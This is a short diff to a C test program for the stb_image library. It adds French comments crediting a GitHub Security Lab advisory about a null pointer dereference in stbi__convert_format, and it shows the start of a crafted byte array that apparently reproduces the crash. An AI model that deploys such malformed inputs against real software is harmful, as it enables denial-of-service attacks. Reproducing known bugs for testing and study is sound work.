@@ -4,6 +4,8 @@
 #include "stb_image.h"
 
 
+// Code tiré de l'exemple d'exploit du GitHub Security Lab
+// https://securitylab.github.com/advisories/GHSL-2023-145_GHSL-2023-151_stb_image_h/#issue-5-null-pointer-dereference-in-stbi__convert_format-ghsl-2023-149
 int main() {
 
     const uint8_t data[] = {0x53,0x80,0xf6,0x34,0x00,0x00,0x00,0x00,0x00,0x00,
